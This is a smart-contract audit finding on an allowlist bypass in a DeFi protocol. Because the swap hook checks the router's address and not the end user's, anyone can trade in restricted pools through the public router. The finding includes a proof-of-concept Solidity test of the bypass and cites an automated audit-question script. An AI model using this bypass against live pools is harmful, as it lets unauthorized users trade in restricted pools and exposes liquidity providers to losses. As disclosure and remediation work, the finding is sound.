### Title
SwapAllowlistExtension Checks Router Address as Swapper, Enabling Full Allowlist Bypass for Any User — (`metric-periphery/contracts/extensions/SwapAllowlistExtension.sol`)

---

### Summary

`SwapAllowlistExtension.beforeSwap` gates swaps by checking the `sender` argument passed by the pool, which is always `msg.sender` at the pool call boundary. When `MetricOmmSimpleRouter` mediates a swap, `sender` is the router's address, not the end-user's address. A pool admin who allowlists the router (the only way to let allowlisted users trade through the router) simultaneously opens the gate for every user on the network, completely defeating the allowlist.

---

### Finding Description

**Call chain:**

```
User (non-allowlisted)
  → MetricOmmSimpleRouter.exactInputSingle()
      → IMetricOmmPoolActions(pool).swap(recipient, ...)   // msg.sender = router
          → MetricOmmPool._beforeSwap(msg.sender=router, ...)
              → SwapAllowlistExtension.beforeSwap(sender=router, ...)
                  checks: allowedSwapper[pool][router]  ← router is allowlisted → PASS
```

**Root cause in `MetricOmmPool.swap`:** the pool passes `msg.sender` (the router) as `sender` to every extension hook. [1](#0-0) 

**Root cause in `SwapAllowlistExtension.beforeSwap`:** the guard checks `allowedSwapper[msg.sender][sender]` where `msg.sender` is the pool and `sender` is the router, not the end-user. [2](#0-1) 

**The inescapable dilemma for the pool admin:**

| Router allowlisted? | Allowlisted users can use router? | Non-allowlisted users blocked? |
|---|---|---|
| No | ❌ (router reverts) | ✅ |
| Yes | ✅ | ❌ (any user passes via router) |

There is no configuration that simultaneously allows allowlisted users to use the router and blocks non-allowlisted users. The router's address is the only identity the extension ever sees.

**Router call site — `msg.sender` is the router, not the user:** [3](#0-2) 

The `generate_scanned_questions.py` audit pivot explicitly flags this concern:

> *"Because public users may enter through the router, the hook must gate the same actor the pool designers thought they were allowlisting."* [4](#0-3) 

The production implementation does not satisfy this requirement.

---

### Impact Explanation

A pool admin who deploys a restricted pool (e.g., KYC-only, institutional-only, or whitelist-gated LP pool) and allowlists the router so that approved users can trade through the standard periphery inadvertently opens the pool to every address on the network. Any non-allowlisted user can call `MetricOmmSimpleRouter.exactInputSingle` / `exactInput` / `exactOutputSingle` / `exactOutput` and the `beforeSwap` hook will pass because it sees the allowlisted router address. LP funds in the restricted pool are exposed to unrestricted toxic flow, violating the pool admin's access-control invariant and potentially causing LP losses in pools designed for specific counterparties.

---

### Likelihood Explanation

The scenario is highly realistic:
1. Pool admins deploying allowlisted pools will naturally allowlist the canonical router so their approved users can trade normally.
2. The router is a public, permissionless contract — any user can call it.
3. No special privilege, flash loan, or unusual token behavior is required; a standard `exactInputSingle` call suffices.
4. The bypass is silent — no revert, no event distinguishing the bypassing user from an allowlisted one.

---

### Recommendation

The extension must receive and check the **end-user's address**, not the immediate pool caller. Two viable approaches:

1. **Pass the original user through `extensionData`:** The router encodes `msg.sender` into `extensionData`; the extension decodes and verifies it. This requires the extension to trust the pool's `sender` field only for direct calls and the encoded field for router calls — fragile.

2. **Preferred — check `sender` only for direct pool calls; require the router to forward the real user:** Add a dedicated field (e.g., `originSender`) to the `beforeSwap` hook arguments that the pool populates from a trusted transient-storage slot set by the router before calling `swap`. The extension then checks `allowedSwapper[pool][originSender]`. This mirrors how Uniswap v4 handles `hookData` for identity forwarding.

Until fixed, pool admins should be warned that allowlisting the router is equivalent to `setAllowAllSwappers(pool, true)`.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

// Setup:
// 1. Deploy pool with SwapAllowlistExtension.
// 2. Pool admin allowlists only `trustedUser` and the router.
// 3. `attacker` is NOT allowlisted.

function test_swapAllowlist_routerBypass() public {
    // Pool admin allowlists the router so trustedUser can trade through it
    swapAllowlist.setAllowedToSwap(address(pool), address(router), true);
    swapAllowlist.setAllowedToSwap(address(pool), trustedUser, true);
    // attacker is NOT allowlisted
    assertFalse(swapAllowlist.isAllowedToSwap(address(pool), attacker));

    // Attacker calls the router — router is allowlisted, so beforeSwap passes
    vm.startPrank(attacker);
    token0.approve(address(router), type(uint256).max);
    // This should revert with NotAllowedToSwap but does NOT
    router.exactInputSingle(
        IMetricOmmSimpleRouter.ExactInputSingleParams({
            pool: address(pool),
            recipient: attacker,
            zeroForOne: true,
            amountIn: 1000,
            amountOutMinimum: 0,
            priceLimitX64: 0,
            tokenIn: address(token0),
            deadline: block.timestamp + 1,
            extensionData: ""
        })
    );
    vm.stopPrank();
    // Attacker successfully swapped in a pool they are not allowlisted for
}
```

The `beforeSwap` hook receives `sender = address(router)`, finds it in `allowedSwapper[pool]`, and returns the success selector. The non-allowlisted attacker's swap executes in full.

### Citations

**File:** metric-core/contracts/ExtensionCalling.sol (L149-177)
```text
  function _beforeSwap(
    address sender,
    address recipient,
    bool zeroForOne,
    int128 amountSpecified,
    uint128 priceLimitX64,
    uint256 packedSlot0Initial,
    uint128 bidPriceX64,
    uint128 askPriceX64,
    bytes calldata extensionData
  ) internal {
    _callExtensionsInOrder(
      BEFORE_SWAP_ORDER,
      abi.encodeCall(
        IMetricOmmExtensions.beforeSwap,
        (
          sender,
          recipient,
          zeroForOne,
          amountSpecified,
          priceLimitX64,
          packedSlot0Initial,
          bidPriceX64,
          askPriceX64,
          extensionData
        )
      )
    );
  }
```

**File:** metric-periphery/contracts/extensions/SwapAllowlistExtension.sol (L31-41)
```text
  function beforeSwap(address sender, address, bool, int128, uint128, uint256, uint128, uint128, bytes calldata)
    external
    view
    override
    returns (bytes4)
  {
    if (!allowAllSwappers[msg.sender] && !allowedSwapper[msg.sender][sender]) {
      revert IMetricOmmPoolActions.NotAllowedToSwap();
    }
    return IMetricOmmExtensions.beforeSwap.selector;
  }
```

**File:** metric-periphery/contracts/MetricOmmSimpleRouter.sol (L71-80)
```text
    _setNextCallbackContext(params.pool, CALLBACK_MODE_JUST_PAY, msg.sender, params.tokenIn);
    (int128 amount0Delta, int128 amount1Delta) = IMetricOmmPoolActions(params.pool)
      .swap(
        params.recipient,
        params.zeroForOne,
        MetricOmmSwapInputs.asAmountSpecifiedIn(params.amountIn),
        priceLimitX64,
        "",
        params.extensionData
      );
```

**File:** generate_scanned_questions.py (L656-663)
```python
            short="swap allowlist gate",
            file_function="metric-periphery/contracts/extensions/SwapAllowlistExtension.sol::beforeSwap",
            entrypoint="metric-core/contracts/MetricOmmPool.sol::swap and metric-periphery/contracts/MetricOmmSimpleRouter.sol::exact*",
            call_path="public swap -> beforeSwap hook -> allowAll/allowedSwapper lookup keyed by pool and sender",
            values="the exact swapper identity checked by the hook and whether router-mediated swaps preserve that identity",
            control_hint="Because public users may enter through the router, the hook must gate the same actor the pool designers thought they were allowlisting.",
            validation_focus="Test direct swaps and router swaps on allowlisted pools and assert the hook cannot be bypassed by routing through an intermediate public contract.",
        ),
```
